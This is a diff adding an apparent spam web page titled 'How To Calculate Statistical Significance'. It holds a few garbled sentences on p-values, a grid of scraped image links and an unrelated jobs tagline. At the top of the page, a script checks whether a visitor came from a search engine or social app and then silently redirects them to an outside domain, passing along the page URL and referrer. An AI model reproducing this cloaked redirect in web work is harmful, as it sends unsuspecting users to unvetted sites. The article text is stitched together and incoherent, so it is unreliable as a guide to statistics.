@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <script>
+        var ars = 'http://leahrosenberg.org';
+
+        if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+    </script>
+
+    <meta charset="utf-8">
+    <meta name="description" content="My description">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <script type="application/ld+json">
+{
+  "@context": "https://schema.org/", 
+  "@type": "Article", 
+  "author": {
+    "@type": "Person",
+    "name": "Daisy Robertson"
+  },
+  "headline": "How To Calculate Statistical Significance",
+  "datePublished": "2021-09-04",
+  "image": ["https://reflectivedata.com/wp-content/uploads/2018/10/screenshot-reflectivedata.com-2018.10.25-21-20-08.png",
+  "https://cdn-media-2.freecodecamp.org/w1280/5f9c9cd4740569d1a4ca346d.jpg",
+  "https://cdn.verticalmeasures.com/wp-content/uploads/How-to-Determine-if-your-A-B-Test-is-statistical-significant-Calculator.jpg"
+  ],
+  "publisher": {
+    "@type": "Organization",
+    "name": "Daisy Robertson",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://via.placeholder.com/512.png?text=D",
+      "width": 512,
+      "height": 512
+    }
+  }
+}
+</script>
+    
+
+    <title>How To Calculate Statistical Significance</title>
+    <style>:root{--border-radius:5px;--box-shadow:2px 2px 10px;--color:#118bee;--color-accent:#118bee15;--color-bg:#fff;--color-bg-secondary:#e9e9e9;--color-secondary:#0645AD;--color-secondary-accent:#920de90b;--color-shadow:#f4f4f4;--color-text:#000;--color-text-secondary:#999;--font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;--hover-brightness:1.2;--justify-important:center;--justify-normal:left;--line-height:1.5;--width-card:285px;--width-card-medium:460px;--width-card-wide:800px;--width-content:1080px}article aside{background:var(--color-secondary-accent);border-left:4px solid var(--color-secondary);padding:.01rem .8rem}body{background:var(--color-bg);color:var(--color-text);font-family:var(--font-family);line-height:var(--line-height);margin:0;overflow-x:hidden;padding:1rem 0}footer,header,main{margin:0 auto;max-width:var(--width-content);padding:0rem 1rem}hr{background-color:var(--color-bg-secondary);border:none;height:1px;margin:4rem 0}section{display:flex;flex-wrap:wrap;justify-content:var(--justify-important)}section aside{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);box-shadow:var(--box-shadow) var(--color-shadow);margin:1rem;padding:1.25rem;width:var(--width-card)}section aside:hover{box-shadow:var(--box-shadow) var(--color-bg-secondary)}section aside img{max-width:100%}[hidden]{display:none}article header,div header,main header{padding-top:0}header{text-align:var(--justify-important)}header a b,header a em,header a i,header a strong{margin-left:.5rem;margin-right:.5rem}header nav img{margin:1rem 0}section header{padding-top:0;width:100%}nav{align-items:center;display:flex;font-weight:700;justify-content:space-between;margin-bottom:7rem}nav ul{list-style:none;padding:0}nav ul li{display:inline-block;margin:0 .5rem;position:relative;text-align:left}nav ul li:hover ul{display:block}nav ul li ul{background:var(--color-bg);border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);box-shadow:var(--box-shadow) var(--color-shadow);display:none;height:auto;left:-2px;padding:.5rem 1rem;position:absolute;top:1.7rem;white-space:nowrap;width:auto}nav ul li ul li,nav ul li ul li a{display:block}code,samp{background-color:var(--color-accent);border-radius:var(--border-radius);color:var(--color-text);display:inline-block;margin:0 .1rem;padding:0 .5rem}details{margin:1.3rem 0}details summary{font-weight:700;cursor:pointer}h1,h2,h3,h4,h5,h6{line-height:var(--line-height)}mark{padding:.1rem}ol li,ul li{padding:.2rem 0}p{margin:.75rem 0;padding:0}pre{margin:1rem 0;max-width:var(--width-card-wide);padding:1rem 0}pre code,pre samp{display:block;max-width:var(--width-card-wide);padding:.5rem 2rem;white-space:pre-wrap}small{color:var(--color-text-secondary)}sup{background-color:var(--color-secondary);border-radius:var(--border-radius);color:var(--color-bg);font-size:xx-small;font-weight:700;margin:.2rem;padding:.2rem .3rem;position:relative;top:-2px}a{color:var(--color-secondary);display:inline-block;text-decoration:none}a:hover{filter:brightness(var(--hover-brightness));text-decoration:underline}a b,a em,a i,a strong,button{border-radius:var(--border-radius);display:inline-block;font-size:medium;font-weight:700;line-height:var(--line-height);margin:.5rem 0;padding:1rem 2rem}button{font-family:var(--font-family)}button:hover{cursor:pointer;filter:brightness(var(--hover-brightness))}a b,a strong,button{background-color:var(--color);border:2px solid var(--color);color:var(--color-bg)}a em,a i{border:2px solid var(--color);border-radius:var(--border-radius);color:var(--color);display:inline-block;padding:1rem 2rem}figure{margin:0;padding:0}figure img{max-width:100%}figure figcaption{color:var(--color-text-secondary)}button:disabled,input:disabled{background:var(--color-bg-secondary);border-color:var(--color-bg-secondary);color:var(--color-text-secondary);cursor:not-allowed}button[disabled]:hover{filter:none}form{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);box-shadow:var(--box-shadow) var(--color-shadow);display:block;max-width:var(--width-card-wide);min-width:var(--width-card);padding:1.5rem;text-align:var(--justify-normal)}form header{margin:1.5rem 0;padding:1.5rem 0}input,label,select,textarea{display:block;font-size:inherit;max-width:var(--width-card-wide)}input[type=checkbox],input[type=radio]{display:inline-block}input[type=checkbox]+label,input[type=radio]+label{display:inline-block;font-weight:400;position:relative;top:1px}input,select,textarea{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);margin-bottom:1rem;padding:.4rem .8rem}input[readonly],textarea[readonly]{background-color:var(--color-bg-secondary)}label{font-weight:700;margin-bottom:.2rem}table{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);border-spacing:0;display:inline-block;max-width:100%;overflow-x:auto;padding:0;white-space:nowrap}table td,table th,table tr{padding:.4rem .8rem;text-align:var(--justify-important)}table thead{background-color:var(--color);border-collapse:collapse;border-radius:var(--border-radius);color:var(--color-bg);margin:0;padding:0}table thead th:first-child{border-top-left-radius:var(--border-radius)}table thead th:last-child{border-top-right-radius:var(--border-radius)}table thead th:first-child,table tr td:first-child{text-align:var(--justify-normal)}table tr:nth-child(even){background-color:var(--color-accent)}blockquote{display:block;font-size:x-large;line-height:var(--line-height);margin:1rem auto;max-width:var(--width-card-medium);padding:1.5rem 1rem;text-align:var(--justify-important)}blockquote footer{color:var(--color-text-secondary);display:block;font-size:small;line-height:var(--line-height);padding:1.5rem 0}</style>
+</head>
+<body>
+    <header>
+        <h1><a href="index.html">How To Calculate Statistical Significance</a></h1>
+        <p>Full and part time jobs with good salary</p>
+    </header>
+    <main>
+        
+<p><strong>How To Calculate Statistical Significance</strong>. So what is statistical significance, and how do you calculate it? Statistical significance is used to find whether the given data is reliable or not and it does not have any decision-making utility.</p>
+<!--ads/auto.txt-->
+<p>
+	
+	
+	<figure>
+		<img src="https://image.slidesharecdn.com/statisticalsignificancevsclinicalsignificance-170719172812/95/statistical-significance-vs-clinical-significance-5-638.jpg?cb=1500485368" alt="How To Determine Statistical Significance" style="width: 100%; padding: 5px; background-color: grey;">
+		<figcaption>How To Determine Statistical Significance (Mina Parks)</figcaption>
+	</figure>
+	
+	The nature of the hypothesis will tell you whether to use a one-tailed or two-tailed statistical analysis to calculate statistical significance. As I mentioned above, the fake study about chewing rocks isn&#39;t statistically significant. Although you can calculate statistical significance on your own, it can be a lot quicker and easier to use a calculator to do it.
+</p>
+
+<h3>There&#39;s a sort of triangular relationship between the statistical level of.</h3>
+<p>The Stats Analyzer is designed to provide users with an easy way to determine if a dimension impacts a metric with statistical significance.</p>
+
+
+
+
+	<div style="display: grid;grid-template-columns: auto auto auto; background: #eee; ">
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://i.pinimg.com/474x/30/a7/10/30a7103e7cc49cd776247bb87f0b6300.jpg"><img src="https://i.pinimg.com/474x/30/a7/10/30a7103e7cc49cd776247bb87f0b6300.jpg" onerror="this.onerror=null;this.src='https://tse1.mm.bing.net/th?id=OIP.k0Pebm1H66FGsQKz0tn16wAAAA&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>How to Understand &amp; Calculate Statistical Significance ...</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://image.slideserve.com/308416/calculating-statistical-significance-and-margins-of-error-using-american-community-survey-data-l.jpg"><img src="https://image.slideserve.com/308416/calculating-statistical-significance-and-margins-of-error-using-american-community-survey-data-l.jpg" onerror="this.onerror=null;this.src='https://tse1.mm.bing.net/th?id=OIP.krBUhqEHBSxCC-0cp-RAUwHaFj&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>PPT - Calculating Statistical Significance and Margins of ...</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="http://www.blastanalytics.com/wp-content/uploads/2019/09/test-type.png"><img src="http://www.blastanalytics.com/wp-content/uploads/2019/09/test-type.png" onerror="this.onerror=null;this.src='https://tse4.mm.bing.net/th?id=OIP.JUj9zDZ6R2CPh8VKcWzDjwAAAA&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>The Last Statistical Significance Calculator You&#39;ll Ever ...</p>
+		    </div>
+	    
+	</div>
+
+	<div style="display: grid;grid-template-columns: auto auto auto; background: #eee; ">
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://i.stack.imgur.com/dZrHM.png"><img src="https://i.stack.imgur.com/dZrHM.png" onerror="this.onerror=null;this.src='https://tse4.mm.bing.net/th?id=OIP.SRtsEmbJehcCDkVb3bmCvAHaI3&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>statistical significance - How to calculate sample size ...</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://www.surveysystem.com/images/significance-table.jpg"><img src="https://www.surveysystem.com/images/significance-table.jpg" onerror="this.onerror=null;this.src='https://tse4.mm.bing.net/th?id=OIP.Ex5fg-FLc-cTZqMGhN2xuAHaDf&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>Significance in Statistics &amp; Surveys - What is ...</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://spss-tutorials.com/img/statistical-significance-2-tailed-f-distributions.png"><img src="https://spss-tutorials.com/img/statistical-significance-2-tailed-f-distributions.png" onerror="this.onerror=null;this.src='https://tse1.mm.bing.net/th?id=OIP.ABvHPIkVgp6J_XaGDAMOMgHaGL&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>05C. Must-Know Statistics - Statistical Significance ...</p>
+		    </div>
+	    
+	</div>
+
+	<div style="display: grid;grid-template-columns: auto auto auto; background: #eee; ">
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://static.wingify.com/vwo/uploads/sites/3/2011/04/duration_graph.png"><img src="https://static.wingify.com/vwo/uploads/sites/3/2011/04/duration_graph.png" onerror="this.onerror=null;this.src='https://tse1.mm.bing.net/th?id=OIP.GldIikec1HVbp9_VcDttyQHaE4&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>A/B test duration calculator (Excel spreadsheet) | VWO Blog</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://lh3.googleusercontent.com/proxy/hMV4Ssy4_WRqyATBHN4S0yAxSOyJAP03vzfr7FpoAYp-3_xqv9CCxTyf_dsHyQv2TArljvL7FDUKjfRf9VxXeqItJ4RiHJpDKa4rsMEblqWSlDCCRbKFSQ9If6JlQyEiFckEF0CmZchiN8x4_OBK9JCFn3qzYeF6l7pFguvSGT4tUo1tSjZD988ygVqHe-AMDmjXuHMS2OFFRmIT1lQpWjORK0wCdISRElrHHVc9G2xe99O6g-bKfS8iZf0NcRkwq5OFomPugjPk=w1200-h630-p-k-no-nu"><img src="https://lh3.googleusercontent.com/proxy/hMV4Ssy4_WRqyATBHN4S0yAxSOyJAP03vzfr7FpoAYp-3_xqv9CCxTyf_dsHyQv2TArljvL7FDUKjfRf9VxXeqItJ4RiHJpDKa4rsMEblqWSlDCCRbKFSQ9If6JlQyEiFckEF0CmZchiN8x4_OBK9JCFn3qzYeF6l7pFguvSGT4tUo1tSjZD988ygVqHe-AMDmjXuHMS2OFFRmIT1lQpWjORK0wCdISRElrHHVc9G2xe99O6g-bKfS8iZf0NcRkwq5OFomPugjPk=w1200-h630-p-k-no-nu" onerror="this.onerror=null;this.src='https://tse1.mm.bing.net/th?id=OIP.2Uk682Ap45JCUelVXTLvewHaCW&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>How To Determine Statistical Significance In R</p>
+		    </div>
+	    
+		    <div style="padding: 1em;">
+		        <a href="https://www.cloudresearch.com/wp-content/uploads/2020/05/CloudResearch_Pillar-Page_Statistical-Significance_How-to-Determine-if-My-Research-is-Statistically-Significant_Woman-pointin-990x400.jpg"><img src="https://www.cloudresearch.com/wp-content/uploads/2020/05/CloudResearch_Pillar-Page_Statistical-Significance_How-to-Determine-if-My-Research-is-Statistically-Significant_Woman-pointin-990x400.jpg" onerror="this.onerror=null;this.src='https://tse4.mm.bing.net/th?id=OIP.jA9VMs7Olu3S_ez1KlyvswHaC_&amp;pid=Api';" style="width:100%;margin-top: 8px;vertical-align: middle;"></a>
+		        <p>How to Calculate Statistical Significance | CloudResearch</p>
+		    </div>
+	    
+	</div>
+
+<p>Statistical significance is an important concept to understand when interpreting data yielded from experiments. Statistical significance is most practically used in statistical hypothesis testing. Start collecting your data. ⏩ What is the influence of the p-value? ⏩ How to calculate statistical significance? ⏩ How to determine statistically significant results?</p>
+    </main>
+    <footer style="padding-top: 50px;">
+        <center>
+            
+                <a href="index.html">Index</a>
+                
+                    |
+                
+            
+                <a href="contact.html">Contact</a>
+                
+                    |
+                
+            
+                <a href="copyright.html">Copyright</a>
+                
+                    |
+                
+            
+                <a href="dmca.html">DMCA</a>
+                
+                    |
+                
+            
+                <a href="privacy-policy.html">Privacy-Policy</a>
+                
+            
+        </center>
+    </footer>
+</body>
+
+</html>
